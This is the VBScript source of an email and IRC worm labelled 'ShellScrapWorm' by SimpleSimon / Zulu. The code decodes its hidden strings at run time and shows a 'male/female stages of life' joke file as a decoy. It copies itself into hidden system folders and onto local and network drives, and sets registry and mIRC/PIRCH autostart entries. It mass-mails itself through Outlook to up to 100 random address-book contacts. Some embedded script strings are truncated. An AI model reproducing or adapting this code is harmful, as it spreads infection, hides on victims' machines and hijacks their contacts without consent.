'MIRC/NETWORK/OUTLOOK/PIRCH.ShellScrapWorm by SimpleSimon / Zulu

On Error Resume Next

Dim Y

Set P=CreateObject("Scripting.FileSystemObject")

Set FZ=P.OpenTextFile(WScript.ScriptFullName,1)

Do While Mid(FZ.ReadLine,21,10)<>"e(WScript."

Loop

FZ.SkipLine

ZP=FZ.ReadLine

FZ.Close

Set R=CreateObject(D("XTdqjos-Tgfkk"))

PD=D("KJEF`TSBHFT-SWS-TGT")

I=True

J=Chr(13)&Chr(10)

If Not P.FileExists(K(OE(D("TsbqsVo")),PD)) Then

I=False

Set A=P.CreateTextFile(K(E(2),D("KJEF`TSBHFT-SWS")),True)

A.Write("- The male stages of life:"&J&J&"Age. Seduction lines."&J&"17
My parents are away for the weekend."&J&"25   My girlfriend is away for
the weekend."&J&"35   My fiancee is away for the weekend."&J&"48   My wife
is away for the weekend."&J&"66   My second wife is dead."&J&J&"Age.
Favorite sport."&J&"17   Sex."&J&"25   Sex."&J&"35   Sex."&J&"48
Sex."&J&"66   Napping."&J&J&"Age. Definiton of a successful date."&J&"17
Tongue."&J&"25   Breakfast."&J&"35   She didn't set back my
therapy."&J&"48   I didn't have to meet her kids."&J&"66   Got home
alive."&J&J&J&"- The female stages of life:"&J&J&"Age. Favourite
fantasy."&J&"17   Tall, dark and hansome."&J&"25   Tall, dark and hansome
with money."&J&"35   Tall, dark and hansome with money and a brain."&J&"48
  A man with hair."&J&"6   6   A man."&

A.Close

R.Run(K(E(2),D("KJEF`TSBHFT-SWS")))

End If

If Not I Then

N=""

Set N=CreateObject(D("Xpqc-Bookjdbsjpm"))

If N Is Nothing Then

T=L(True)

If T="" Then T=L(False)

Else

T=W(PD)

If T="" Then T=W(D(")-TGT"))

N.Quit

End If

Else

T=K(OE(D("TsbqsVo")),PD)

End If

If T<>"" Then

P.CopyFile T,K(E(0),PD)

Set F=P.GetFile(K(E(0),PD))

F.Attributes=32

P.CopyFile K(E(0),PD),K(E(1),D("NTJMEP25-SKA"))

If Not P.FolderExists(Left(E(0),3)&D("QFDZDKFC")) Then

P.CreateFolder(Left(E(0),3)&D("QFDZDKFC"))

Set F=P.GetFolder(Left(E(0),3)&D("QFDZDKFC"))

F.Attributes=22

End If

P.CopyFile K(E(0),PD),K(Left(E(0),3)&D("QFDZDKFC"),D("NTQDZDKC-CBS"))

Set F=P.GetFile(K(Left(E(0),3)&D("QFDZDKFC"),D("NTQDZDKC-CBS")))

F.Attributes=39

Randomize

For Each Z In P.Drives

If Z.DriveType=2 Then UQ Z.DriveLetter&D("9[")

Next

UQ OE(D("NzCpdvnfmst"))

UQ OE(D("Oqphqbnt"))

Set A=P.CreateTextFile(K(E(1),D("TDBMQFH-UAT")),True)

A.Write("On Error Resume Next"&J&"Dim HU"&J&"Set
Y=CreateObject(""Scripting.FileSystemObject"")"&J&"Set
SJ=Y.OpenTextFile(WScript.ScriptFullName,1)"&J&"Do While
Mid(SJ.ReadLine,5,10)<>""Q=CreateOb"""&J&"Loop"&J&"SJ.SkipLine"&J&"LH=SJ.ReadLine"&J&"SJ.Close"&J&"Set Q=CreateObject(Z(""VRbshqu/Ridmm""))"&J&"FP=Z(""MHGD^RU@FDR/UYU/RIR"")"&J&"If Y.FileExists(P(J(Z(""Ru`suTq"")),FP)) Then Y.DeleteFile P(J(Z(""Ru`suTq"")),FP),True"&J&"K=False"&J&"If Not Y.FileExists(P(H(0),FP)) Then"&J&"If Y.FileExists(P(H(1),Z(""LRHOGN07/UMC""))) Then"&J&"Y.CopyFile P(H(1),Z(""LRHOGN07/UMC"")),P(H(0),FP)"&J&"Else"&J&"If Y.FileExists(P(Left(H(0),3)&Z(""SDBXBMDE""),Z(""LRSBXBME/E@U""))) Then"&J&"Y.CopyFile P(Left(H(0),3)&Z(""SDBXBMDE""),Z(""LRSBXBME/E@U"")),P(H(0),FP)"&J&"Set L=Y.GetFile(P(H(0),FP))"&J&"L.Attributes=32"&J&"Else"&J&"K=True"&J&"End If"&J&"End If"&J&"End If"&J&"If Not K Then"&J&"If Not Y.FileExists(P(H(1),Z(""LRHOGN07/UMC""))) Then Y.CopyFile P(H(0),FP),P(H(1),Z(""LRHOGN07/UMC""))   "&J&"If Not Y.FileExis

A.Close

P.CopyFile K(E(1),D("TDBMQFH-UAT")),
K(Left(E(0),3)&D("QFDZDKFC"),D("QDZDKCAM-CBS"))

Set F=P.GetFile(K(Left(E(0),3)&D("QFDZDKFC"),D("QDZDKCAM-CBS")))

F.Attributes=39

R.RegWrite
D("GLFZ`KPDBK`NBDGJMF[Tpesxbqf[Njdqptpes[Xjmcpxt[DvqqfmsUfqtjpm[
QvmTfqujdft[TdbmQfh"),K(E(0),D("XTDQJOS-FWF"))&"
"&K(E(1),D("TDBMQFH-UAT"))

Set
A=P.CreateTextFile(K(Left(E(0),3)&D("QFDZDKFC"),D("CAJMCFW-UAT")),True)

A.Write("On Error Resume Next"&J&"Set
I=CreateObject(""Scripting.FileSystemObject"")"&J&"Set
M=I.OpenTextFile(WScript.ScriptFullName, 1)"&J&"Do While
Mid(M.ReadLine,18,10)<>""adLine,
18,"""&J&"Loop"&J&"M.SkipLine"&J&"N=M.ReadLine"&J&"M.Close"&J&"Set
Z=CreateObject(T(""VRbshqu/Ridmm""))"&J&"X=
T(""MHGD^RU@FDR/UYU/RIR"")"&J&"If I.FileExists(F(A(T(""Ru`suTq"")),X))
Then I.DeleteFile F(A(T(""Ru`suTq"")),X),True"&J&"Q= False"&J&"If Not
I.FileExists(F(U(0),X)) Then"&J&"If
I.FileExists(F(U(1),T(""LRHOGN07/UMC""))) Then"&J&"I.CopyFile
F(U(1),T(""LRHOGN07/UMC"")), F(U(0),X)"&J&"Else"&J&"If
I.FileExists(F(Left(U(0),3)&T(""SDBXBMDE""), T(""LRSBXBME/E@U"")))
Then"&J&"I.CopyFile F(Left(U(0),3)&T(""SDBXBMDE""),
T(""LRSBXBME/E@U"")),F(U(0),X)"&J&"Set
Y=I.GetFile(F(U(0),X))"&J&"Y.Attributes= 32"&J&"Else"&J&"Q=True"&J&"End
If"&J&"End If"&J&"End If"&J&"If Not Q Then"&J&"If Not I.FileExists(F(U(1),
T(""LRHOGN07/UMC""))) Then I.CopyFile
F(U(0),X),F(U(1),T(""LRHOGN07/UMC""))"&J&"If Not I.F
ileExists(F(Left(U(0),

A.Close

Set F=P.GetFile(K(Left(E(0),3)&D("QFDZDKFC"),D("CAJMCFW-UAT")))

F.Attributes=39

P.CopyFile K(Left(E(0),3)&D("QFDZDKFC"),D("CAJMCFW-UAT")),K(E(1),
D("UABTFS-PKA"))

Set F=P.GetFile(K(E(1),D("UABTFS-PKA")))

F.Attributes=32

R.RegWrite
D("GLFZ`VTFQT[-CFEBVKS[Tpesxbqf[Njqbajkjt[JDR[Bhfms[Boot[JDR[Fmbakf"),
D("Zft")

R.RegWrite D(
"GLFZ`VTFQT[-CFEBVKS[Tpesxbqf[Njqbajkjt[JDR[Bhfms[Boot[JDR[Obqbnfsfqt" ),
K(Left(E(0),3)&D("QFDZDKFC"), D("CAJMCFW-UAT"))

R.RegWrite D(
"GLFZ`VTFQT[-CFEBVKS[Tpesxbqf[Njqbajkjt[JDR[Bhfms[Boot[JDR[Obsg" ),
K(E(0),D("XTDQJOS-FWF"))

R.RegWrite D(
"GLFZ`VTFQT[-CFEBVKS[Tpesxbqf[Njqbajkjt[JDR[Bhfms[Boot[JDR[Tsbqsvo"),E(0)

S=""

S=R.RegRead(D( "GLFZ`DKBTTFT`QPPS[")&R.RegRead(
D("GLFZ`DKBTTFT`QPPS[-sws["))&D("[CfebvksJdpm["))

If S<>"" Then R.RegWrite D("GLFZ`DKBTTFT`QPPS[TgfkkTdqbo[CfebvksJdpm["),S

R.RegWrite D( "GLFZ`DKBTTFT`QPPS[swsejkf[BkxbztTgpxFws"),""

If P.FileExists(K(E(0),D("QFHFCJS-FWF"))) Then

GS=K(Left(E(0),3)&D( "QFDZDKFC"),D("QFDZDKFC-UWC"))

P.MoveFile K(E(0),D("QFHFCJS-FWF")),GS

Set F=P.GetFile(GS)

F.Attributes=39

R.RegWrite D("GLFZ`DKBTTFT`QPPS[")&R.RegRead(D(
"GLFZ`DKBTTFT`QPPS[-qfh["))&D("[CfebvksJdpm["),GS&D("+2")

R.RegWrite D("GLFZ`DKBTTFT`QPPS[")&R.RegRead(D(
"GLFZ`DKBTTFT`QPPS[-qfh["))&D("[tgfkk[pofm[dpnnbmc["),GS&D(" ""&2""")

End If

If Not I Then

Set C=CreateObject(D("XTdqjos-Mfsxpql"))

Set Q=C.EnumNetworkDrives

If Q.Count>0 Then

For B=0 To Q.Count-1

If Q.Item(B)<>"" Then

If P.FolderExists(K(Q.Item(B),Mid(OE(D("TsbqsVo")),4))) Then P.CopyFile
K(E(0),PD),K(K(Q.Item(B),Mid(OE(D("TsbqsVo")),4)),PD) Else P.CopyFile
K(E(0),PD),K(Q.Item(B),PD)

End If

Next

End If

End If

HG=""

HG=R.RegRead(D(
"GLFZ`KPDBK`NBDGJMF[Tpesxbqf[Njdqptpes[Xjmcpxt[DvqqfmsUfqtjpm[PTMbnf" ))

If HG="" Then

JM=""

Set JM=CreateObject(D("Pvskppl-Bookjdbsjpm"))

If JM Is Not Nothing Then

Set JS=JM.GetNameSpace(D("NBOJ"))

M=False

For Each G In JS.AddressLists

If G.AddressEntries.Count>0 Then

Set U=JM.CreateItem(0)

If G.AddressEntries.Count>100 Then

Dim FL(99)

For VH=0 To 99

FL(VH)=Int(G.AddressEntries.Count*Rnd+1)

Next

For VH=0 To 99

For JG=VH+1 To 99

If FL(VH)=FL(JG) And FL(VH)<>0 Then FL(JG)=0

Next

Next

For VH=0 To 99

If FL(VH)=0 Then FL(VH)=Int(G.AddressEntries.Count*Rnd+1)

Next

For VH=0 To 99

For JG=VH+1 To 99

If FL(VH)=FL(JG) And FL(VH)<>0 Then FL(JG)=0

Next

Next

For VH=0 To 99

If FL(VH)<>0 Then

Set FP=G.AddressEntries(FL(VH))

If VH=0 Then U.BCC=FP.Address Else U.BCC=U.BCC&D("< ")&FP.Address

End If

Next

Else

For VH=1 To G.AddressEntries.Count

Set FP=G.AddressEntries(VH)

If VH=1 Then U.BCC=FP.Address Else U.BCC=U.BCC&D("< ")&FP.Address

Next

End If

X=""

If Int(2*Rnd+1)=1 Then X=D("Ex9 ")

O=Int(3*Rnd+1)

If O=1 Then

X=X&D("Kjef tsbhft")

ElseIf O=2 Then

X=X&D("Evmmz")

Else

X=X&D("Iplft")

End If

If Int(2*Rnd+1)=1 Then X=X&D(" sfws")

U.Subject=X

X=""

If Int(3*Rnd+1)>1 Then

X=D("= Sgf nbkf bmc efnbkf tsbhft pe kjef-")

If Int(3*Rnd+1)=1 Then X=X&D(" Azf-")

End If

If Int(2*Rnd+1)=1 Then U.Body=X Else U.HTMLBody=X

U.Attachments.Add K(E(0),PD)

U.DeleteAfterSubmit=True

U.Send

M=True

End If

Next

If M Then R.RegWrite
D("GLFZ`KPDBK`NBDGJMF[Tpesxbqf[Njdqptpes[Xjmcpxt[DvqqfmsUfqtjpm[PTMbnf"
),D("Njdqptpes Xjmcpxt")

End If

End If

End If

If Not I Then P.DeleteFile(K(E(2),D("KJEF`TSBHFT-SWS")))

Function D(FR)

D=""

For JN=1 To Len(FR)

If Asc(Mid(FR,JN,1))<>32 And Asc(Mid(FR,JN,1))<>33 And
Asc(Mid(FR,JN,1))<>34 And Asc(Mid(FR,JN,1))<>160 And
Asc(Mid(FR,JN,1))<>255 Then

If Asc(Mid(FR,JN,1)) Mod 2=0 Then
D=D&Chr(Asc(Mid(FR,JN,1))-Left(Asc(Right(ZP,1)),1)) Else
D=D&Chr(Asc(Mid(FR,JN,1))+Left(Asc(Right(ZP,1)),1))

Else

D=D&Mid(FR,JN,1)

End If

Next

End Function

Function K(EQ,RB)

On Error Resume Next

K=P.BuildPath(EQ,RB)

End Function

Function OE(PQ)

On Error Resume Next

OE=R.SpecialFolders(PQ)

End Function

Function E(GP)

On Error Resume Next

E=P.GetSpecialFolder(GP)

End Function

Function L(WG)

On Error Resume Next

Y=""

H E(2),WG

If Y="" Then WQ D("9["),WG

If Y="" Then WQ D("9[NJQD"),WG

If Y="" Then WQ D("9[NJQD41"),WG

If Y="" Then WQ D("9[OJQDG"),WG

If Y="" Then WQ D("9[OJQDG:7"),WG

If Y="" Then

TQ= R.RegRead(D(
"GLFZ`KPDBK`NBDGJMF[Tpesxbqf[Njdqptpes[Xjmcpxt[DvqqfmsUfqtjpm[OqphqbnEjkftCjq" ))

H K(TQ,D("NJQD")),WG

End If

If Y="" Then H K(TQ,D("NJQD41")),WG

If Y="" Then H K(TQ,D("OJQDG")),WG

If Y="" Then H K(TQ,D("OJQDG:7")),WG

If Y="" Then H OE(D("Cftlspo")),WG

If Y="" Then H OE(D("NzCpdvnfmst")),WG

L=Y

End Function

Sub H(FW,YH)

On Error Resume Next

If P.FolderExists(FW) Then

For Each GC In P.GetFolder(FW).Files

If YH Then

If UCase(GC.Name)=PD Then

Set FK=P.GetFile(GC.Path)

If FK.Size=39936 Then

Y=GC.Path

Exit For

End If

End If

Else

If UCase(P.GetExtensionName(GC.Path))=D("TGT") Then

Set FK=P.GetFile(GC.Path)

If FK.Size=39936 Then

Y=GC.Path

Exit For

End If

End If

End If

Next

If Y="" And Right(FW,2)<>D("9[") Then

For Each SL In P.GetFolder(FW).SubFolders

H SL.Path,YH

Next

End If

End If

End Sub

Sub WQ(HJ,PZ)

On Error Resume Next

For Each Z In P.Drives

If Z.DriveType=2 Then

H Z.DriveLetter&HJ,PZ

If Y<>"" Then Exit For

End If

Next

End Sub

Function W(HQ)

On Error Resume Next

W=""

Set V=N.FileSearch

V.NewSearch

V.FileName=HQ

V.SearchSubFolders=True

For Each Z In P.Drives

If Z.DriveType=2 Then

V.LookIn=Z.DriveLetter&D("9[")

V.Execute

If V.FoundFiles.Count>0 Then

For PS=1 To V.FoundFiles.Count

Set FK=P.GetFile(V.FoundFiles(PS))

If FK.Size=39936 Then

W=V.FoundFiles(PS)

Exit For

End If

Next

If W<>"" Then Exit For

Else

V.NewSearch

V.FileName=HQ

V.SearchSubFolders=True

End If

End If

Next

End Function

Sub UQ(DG)

On Error Resume Next

O=Int(5*Rnd+1)

If O=1 Then

JW=D("JNOPQSBMS")

ElseIf O=2 Then

JW=D("JMEP")

ElseIf O=3 Then

JW=D("QFOPQS")

ElseIf O=4 Then

JW=D("TFDQFS")

Else

JW=D("VMLMPXM")

End If

O=Int(3*Rnd+1)

If O=1 Then

JW=JW&D(".")

ElseIf O=2 Then

JW=JW&D("`")

End If

If O<>3 Then

JW=JW&Int(999*Rnd+1)

End If

JW=JW&D("-SWS-TGT")

If Int(2*Rnd+1)=1 Then JW=LCase(JW)

P.CopyFile K(E(0),PD),K(DG,JW)

End Sub
